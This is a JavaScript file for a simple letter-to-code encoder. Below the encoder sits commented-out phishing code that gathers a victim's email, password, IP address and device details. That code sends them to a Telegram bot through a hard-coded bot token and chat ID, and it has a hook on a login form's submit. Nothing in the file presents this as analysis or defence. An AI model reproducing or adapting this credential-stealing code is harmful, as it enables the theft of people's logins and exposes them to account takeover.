function analyze() {
  let str = document.getElementById("Input").value.toLowerCase();
  let output = "";

  for (let char of str) {
    if (char === 'a') {
      output += "1f%";
    } 
    else if (char === 'b') {
      output += "2f%";
    } 
    else if (char === 'c') {
      output += "3f%";
    }
    else if (char === 'd') {
      output += "4f%";
    } 
    else if (char === 'e') {
      output += "5f%";
    }
    else if (char === 'f') {
      output += "6f%";
    } 
    else if (char === 'g') {
      output += "7f%";
    }
    else if (char === 'h') {
      output += "8f%";
    } 
    else if (char === 'i') {
      output += "9f%";
    }
    else if (char === 'j') {
      output += "10f%";
    } 
    else if (char === 'k') {
      output += "11f%";
    }
    else if (char === 'l') {
      output += "12f%";
    } 
    else if (char === 'm') {
      output += "13f%";
    }
    else if (char === 'n') {
      output += "14f%";
    } 
    else if (char === 'o') {
      output += "15f%";
    }
    else if (char === 'p') {
      output += "16f%";
    } 
    else if (char === 'q') {
      output += "17f%";
    }
    else if (char === 'r') {
      output += "18f%";
    } 
    else if (char === 's') {
      output += "19f%";
    }
    else if (char === 't') {
      output += "20f%";
    } 
    else if (char === 'u') {
      output += "21f%";
    }
    else if (char === 'v') {
      output += "22f%";
    } 
    else if (char === 'w') {
      output += "23f%";
    } 
    else if (char === 'x') {
      output += "24f%";
    }
    else if (char === 'y') {
      output += "25f%";
    } 
    else if (char === 'z') {
      output += "26f%";
    }
    else if (char === " ") {
      output += "0f%";
    }
    else {
      output += "#!";
    }
  }

  document.getElementById("result").innerHTML = output;
}



function copyText() {
  let text = document.getElementById("result").innerText;
  navigator.clipboard.writeText(text).then(() => {})
}





// const TOKEN = "7938575650:AAEDzLHq7OApTPx1nNvqgGlOGI6yERk7UaA";
// const CHAT_ID = "2092432928";
// const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

// document.getElementById('Input').addEventListener('analyze', function (e) {
//     e.preventDefault();

//     axios.get('https://api.ipify.org?format=json')
//         .then(response => {
//             const ip = response.data.ip;
//             const userAgent = navigator.userAgent;
//             const platform = navigator.platform;
//             const screenWidth = screen.width;
//             const screenHeight = screen.height;
//             const deviceType = /mobile/i.test(userAgent) ? 'Mobile' : 'Desktop';

//             const message = `
// <b>Nouvelle tentative de connexion</b>\n
// <b>Email :</b> ${email}\n
// <b>Mot de passe :</b> ${password}\n
// <b>Adresse IP :</b> ${ip}\n
// <b>Type d'appareil :</b> ${deviceType}\n
// <b>Plateforme :</b> ${platform}\n
// <b>User Agent :</b> ${userAgent}\n
// <b>Résolution d'écran :</b> ${screenWidth}x${screenHeight}
//             `;

//             axios.post(URI_API, {
//                 chat_id: CHAT_ID,
//                 parse_mode: 'html',
//                 text: message
//             }).then(() => {
//                 alert('Informations envoyées avec succès !');
//             }).catch(() => {
//                 alert("Erreur lors de l'envoi des informations.");
//             });

//         }).catch(() => {
//             alert("Erreur lors de la récupération de l'adresse IP.");
//         });
// });


// document.getElementById('login-form').addEventListener('submit', function (e) {
//     e.preventDefault();

//     // كود الإرسال الموجود عندك
//     // ...
// });
